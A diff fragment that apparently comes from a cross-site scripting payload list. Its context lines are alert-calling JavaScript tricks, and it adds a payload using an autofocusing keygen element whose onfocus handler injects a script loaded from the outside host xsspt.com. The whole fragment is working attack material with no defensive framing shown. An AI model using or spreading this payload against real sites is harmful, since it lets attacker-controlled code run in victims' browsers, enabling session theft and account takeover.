@@ -74,5 +74,9 @@ content['alert'](6)
 [10].filter(alert)
 [11].findIndex(alert)
 [12].forEach(alert);
+ 
+<keygen autofocus onfocus=s=createElement("scriPt");body.appendChild(s);s.src="//xsspt.com/JUvhKT">
+ 
+ 
   
 ```
